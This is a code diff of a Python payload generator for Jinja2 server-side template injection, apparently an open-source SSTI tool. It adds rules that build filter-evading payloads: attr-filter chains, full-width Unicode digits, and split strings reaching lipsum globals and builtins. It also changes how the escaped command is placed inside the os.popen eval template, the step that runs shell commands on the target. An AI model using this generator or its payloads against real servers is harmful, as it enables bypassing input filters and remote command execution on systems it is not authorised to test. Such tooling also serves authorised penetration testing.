@@ -61,7 +61,7 @@ if sys.version_info >= (3, 8):
     StringManyFormatCTarget = Tuple[Literal["string_many_format_c"], int]
     CharTarget = Tuple[Literal["char"], str]
     StringTarget = Tuple[Literal["string"], str]
-    FormularSumTarget = Tuple[Literal["formular_sum"], List[int]]
+    FormularSumTarget = Tuple[Literal["formular_sum"], List["Target"]]
     AttributeTarget = Tuple[Literal["attribute"], "Target", str]
     ItemTarget = Tuple[Literal["item"], "Target", str]
     ChassAttributeTarget = Tuple[Literal["class_attribute"], "Target", str]
@@ -271,7 +271,8 @@ def tree_precedence(tree):
 
 def str_escape(value: str, quote="'"):
     """
-    转义字符串中的引号和反斜杠
+    转义字符串中的引号和反斜杠，但不会在两旁加上引号。
+    用法："'{}'".format(str_escape("asdf", "'"))
     """
     return value.replace("\\", "\\\\").replace(quote, "\\" + quote)
 
@@ -522,6 +523,7 @@ class PayloadGenerator:
         if self.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
+            logger.debug("Trying gen rule: %s", gen.__name__)
             gen_ret: List[Target] = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
@@ -631,6 +633,15 @@ def generate(
     return payload_generator.generate(gen_type, *args)
 
 
+@expression_gen
+def gen_variable_of_context(context: dict, var_value) -> List[LiteralTarget]:
+    variables = [name for name, value in context.items() if value == var_value]
+    if not variables:
+        return [(UNSATISFIED,)]
+    targets_list = [[(LITERAL, v), (WITH_CONTEXT_VAR, v)] for v in variables]
+    return [(ONEOF, *targets_list)]
+
+
 # ---
 
 
@@ -728,6 +739,7 @@ def gen_plus_addfuncbyfilter(context: dict, a, b):
         [(LITERAL, "|attr('__add__')(")],
         [(LITERAL, '|attr("__add__")(')],
         [(LITERAL, '|attr("\\x5f\\x5fadd\\x5f\\x5f")(')],
+        [(LITERAL, "|attr("), (VARIABLE_OF, "__add__"), (LITERAL, ")(")],
     )
     return [
         (
@@ -762,6 +774,29 @@ def gen_mod_func(context: dict, a, b):
             [
                 (ENCLOSE_UNDER, precedence["attribute"], a),
                 (LITERAL, ".__mod__("),
+                b,
+                (LITERAL, ")"),
+            ],
+        )
+    ]
+
+
+@expression_gen
+def gen_mod_func2(context: dict, a, b):
+    mod_func = (
+        ONEOF,
+        [(LITERAL, "|attr('__mod__')")],
+        [(LITERAL, '|attr("__mod__")')],
+        [(LITERAL, "|attr("), (VARIABLE_OF, "__mod__"), (LITERAL, ")")],
+    )
+    return [
+        (
+            EXPRESSION,
+            precedence["filter"],
+            [
+                (ENCLOSE_UNDER, precedence["filter"], a),
+                mod_func,
+                (LITERAL, "("),
                 b,
                 (LITERAL, ")"),
             ],
@@ -829,40 +864,49 @@ def gen_multiply_func(context: dict, a, b):
     ]
 
 
+@expression_gen
+def gen_multiply_func2(context: dict, a, b):
+    mul_func = (
+        ONEOF,
+        [(LITERAL, "|attr('__mul__')")],
+        [(LITERAL, '|attr("__mul__")')],
+        [(LITERAL, "|attr("), (VARIABLE_OF, "__mul__"), (LITERAL, ")")],
+    )
+    return [
+        (
+            EXPRESSION,
+            precedence["filter"],
+            [
+                (ENCLOSE_UNDER, precedence["filter"], a),
+                mul_func,
+                (LITERAL, "("),
+                b,
+                (LITERAL, ")"),
+            ],
+        )
+    ]
+
+
 # ---
 
 
 @expression_gen
-def gen_formular_sum_add(context, num_list):
-    target_list = [(LITERAL, "({})".format("+".join(str(n) for n in num_list)))]
-    return [(EXPRESSION, precedence["plus"], target_list)]
+def gen_formular_sum_add(context, num_targets):
+    final_target = num_targets[0]
+    for target in num_targets[1:]:
+        final_target = (PLUS, final_target, target)
+    return [final_target]
 
 
 @expression_gen
-def gen_formular_sum_addfunc(context, num_list):
-    num_list = [
-        str(n) if i == 0 else ".__add__({})".format(n) for i, n in enumerate(num_list)
+def gen_formular_sum_tuplesum(context, num_targets):
+    if len(num_targets) == 1:
+        return [num_targets[0]]
+    target_list = [
+        (LITERAL, "("),
+    ] + join_target(sep = (LITERAL, ","), targets = num_targets) + [
+        (LITERAL, ")|sum")
     ]
-    target_list = [(LITERAL, "".join(num_list))]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
-
-
-@expression_gen
-def gen_formular_sum_attraddfund(context, num_list):
-    num_list = [
-        str(n) if i == 0 else f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
-        for i, n in enumerate(num_list)
-    ]
-    target_list = [(LITERAL, "".join(num_list))]
-    return [(EXPRESSION, precedence["filter"], target_list)]
-
-
-@expression_gen
-def gen_formular_sum_tuplesum(context, num_list):
-    if len(num_list) == 1:
-        return [(LITERAL, str(num_list[0]))]
-    payload = "({})|sum".format(",".join(num_list))
-    target_list = [(LITERAL, payload)]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
@@ -926,6 +970,56 @@ def gen_positive_integer_hex(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
     return [(EXPRESSION, precedence["literal"], [(LITERAL, hex(value))])]
+
+
+@expression_gen
+def gen_positive_integer_underline(context: dict, value: int):
+    if value < 0:
+        return [(UNSATISFIED,)]
+    return [(EXPRESSION, precedence["literal"], [(LITERAL, "_".join(str(value)))])]
+
+
+# jinja最新版的integer token正则如下：
+# integer_re = re.compile(
+#     r"""
+#     (
+#         0b(_?[0-1])+ # binary
+#     |
+#         0o(_?[0-7])+ # octal
+#     |
+#         0x(_?[\da-f])+ # hex    <--- 这个支持unicode
+#     |
+#         [1-9](_?\d)* # decimal    <--- 这个支持unicode
+#     |
+#         0(_?0)* # decimal zero
+#     )
+#     """,
+#     re.IGNORECASE | re.VERBOSE,
+# )
+
+
+@expression_gen
+def gen_positive_integer_unicode(context: dict, value: int):
+    if value <= 9:
+        return [(UNSATISFIED,)]
+    chars = [
+        c if i == 0 else chr(ord(c) + ord("０") - ord("0"))
+        for i, c in enumerate(str(value))
+    ]
+    targets_list = [(LITERAL, c) for c in chars]
+    return [(EXPRESSION, precedence["literal"], targets_list)]
+
+
+@expression_gen
+def gen_positive_integer_unicodehex(context: dict, value: int):
+    if value <= 0:
+        return [(UNSATISFIED,)]
+    chars = [
+        chr(ord(c) + ord("０") - ord("0")) if ord("0") <= ord(c) <= ord("9") else c 
+        for i, c in enumerate(hex(value)[2:])
+    ]
+    targets_list = [(LITERAL, "0x")] + [(LITERAL, c) for c in chars]
+    return [(EXPRESSION, precedence["literal"], targets_list)]
 
 
 @expression_gen
@@ -1214,14 +1308,6 @@ def gen_integer_negative(context: dict, value: int):
     return [(EXPRESSION, precedence["subtract"], target_list)]
 
 
-# @req_gen
-# def gen_integer_unicode(context: dict, value: int):
-#     dis = ord("０") - ord("0")
-#     return [
-#         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
-#     ]
-
-
 @expression_gen
 def gen_integer_subtract(context: dict, value: int):
     ints = [
@@ -1441,6 +1527,17 @@ def gen_string_percent_lipsum3(context):
     ]
 
 
+@expression_gen
+def gen_string_percent_lipsum4(context):  # TODO: use variables
+    return [
+        (
+            EXPRESSION,
+            precedence["function_call"],
+            [(LITERAL, "lipsum['__glob''als__']['__builti''ns__']['chr'](37)")],
+        )
+    ]
+
+
 # ((12).__mod__.__doc__|batch(12)|first|last)
 
 
@@ -1645,13 +1742,11 @@ def gen_string_percent_lower_c_literal2(context):
 @expression_gen
 def gen_string_percent_lower_c_context(context):
     if "%c" not in context.values():
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
     vs = [k for k, v in context.items() if v == "%c"]
-    alternatives = [
-        [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
-        for v in vs
-    ]
+    alternatives = [[(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)] for v in vs]
     return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]
+
 
 @expression_gen
 def gen_string_percent_lower_c_concat(context):
@@ -2188,21 +2283,20 @@ def gen_string_2(context: dict, value: str):
     target_list = [(LITERAL, '"{}"'.format("".join(chars)))]
     return [(EXPRESSION, precedence["literal"], target_list)]
 
+
 @expression_gen
 def gen_string_manypercentlowerc(context: dict, value: str):
     if value.replace("%c", "") != "" or len(value) == "":
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
     return [(STRING_MANY_PERCENT_LOWER_C, value.count("%c"))]
+
 
 @expression_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [(UNSATISFIED,)]
     vs = [k for k, v in context.items() if v == value]
-    alternatives = [
-        [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
-        for v in vs
-    ]
+    alternatives = [[(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)] for v in vs]
     return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]
 
 
@@ -2252,11 +2346,16 @@ def gen_string_removedunder(context: dict, value: str):
         return [(UNSATISFIED,)]
     twounderline = (MULTIPLY, (STRING_UNDERLINE,), (INTEGER, 2))
     middle = (STRING, value[2:-2])
-    return [(STRING_CONCATMANY, [
-        twounderline,
-        middle,
-        twounderline,
-    ])]
+    return [
+        (
+            STRING_CONCATMANY,
+            [
+                twounderline,
+                middle,
+                twounderline,
+            ],
+        )
+    ]
 
 
 @expression_gen
@@ -3162,7 +3261,9 @@ def gen_os_popen_read_eval(context, cmd):
             EVAL,
             (
                 STRING,
-                "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")),
+                "__import__('os').popen('{}').read()".format(
+                    str_escape(cmd, quote="'")
+                ),
             ),
         ),
     ]
